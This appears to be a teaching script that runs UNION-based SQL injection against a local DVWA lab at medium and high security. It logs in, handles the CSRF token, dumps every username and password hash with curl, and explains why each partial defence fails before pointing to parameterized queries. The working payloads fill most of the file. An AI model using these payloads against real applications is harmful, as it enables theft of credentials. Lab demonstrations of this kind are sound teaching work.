#!/usr/bin/env bash
# sqli_levels_demo.sh
# Runs the SAME data-theft goal (dump all usernames + password hashes) against
# DVWA at MEDIUM and HIGH security, to show how each partial defence changes the
# attack but does NOT stop it. Uses curl so the output is clean for screenshots.
#
# Usage:  bash tools/sqli_levels_demo.sh
set -euo pipefail

BASE="http://127.0.0.1:4280"
JAR="$(mktemp)"; trap 'rm -f "$JAR"' EXIT

# --- Log in (handle the anti-CSRF token), then pin the session id ----------
TOKEN=$(curl -s -c "$JAR" "$BASE/login.php" \
        | grep -o "user_token' value='[0-9a-f]*'" | grep -o "[0-9a-f]\{32\}")
curl -s -b "$JAR" -c "$JAR" -L \
  --data-urlencode "username=admin" --data-urlencode "password=password" \
  --data-urlencode "user_token=$TOKEN" --data-urlencode "Login=Login" \
  "$BASE/login.php" -o /dev/null
SID=$(grep -o 'PHPSESSID[[:space:]].*' "$JAR" | awk '{print $NF}')

# Pretty-print the First name / Surname pairs from a response on stdin.
show() { sed -e 's/<br \/>/ | /g' | grep -o -E "First name:[^<]*Surname: [^<]*" | nl; }

echo "############ MEDIUM ############"
echo "Defence: input is a dropdown (client-side only) + mysqli_real_escape_string()."
echo "Why it fails: the id is used UNQUOTED, so our injection needs no quotes to escape."
echo "Payload (POST): 1 UNION SELECT user, password FROM users #"
curl -s -H "Cookie: PHPSESSID=$SID; security=medium" -X POST \
  --data-urlencode "id=1 UNION SELECT user, password FROM users #" \
  --data-urlencode "Submit=Submit" "$BASE/vulnerabilities/sqli/" | show

echo
echo "############ HIGH ############"
echo "Defence: id submitted on a SEPARATE page (stored in session) + LIMIT 1."
echo "Why it fails: query is still '\$id' string-concatenation; '#' comments out LIMIT 1."
echo "Payload: ' UNION SELECT user, password FROM users #   (via session-input.php)"
curl -s -H "Cookie: PHPSESSID=$SID; security=high" -X POST \
  --data-urlencode "id=' UNION SELECT user, password FROM users #" \
  --data-urlencode "Submit=Submit" "$BASE/vulnerabilities/sqli/session-input.php" -o /dev/null
curl -s -H "Cookie: PHPSESSID=$SID; security=high" "$BASE/vulnerabilities/sqli/" | show

echo
echo "Both levels still leak every user + hash. The real fix is a parameterized"
echo "query (see DVWA's 'impossible' level and prevention/secure.php)."
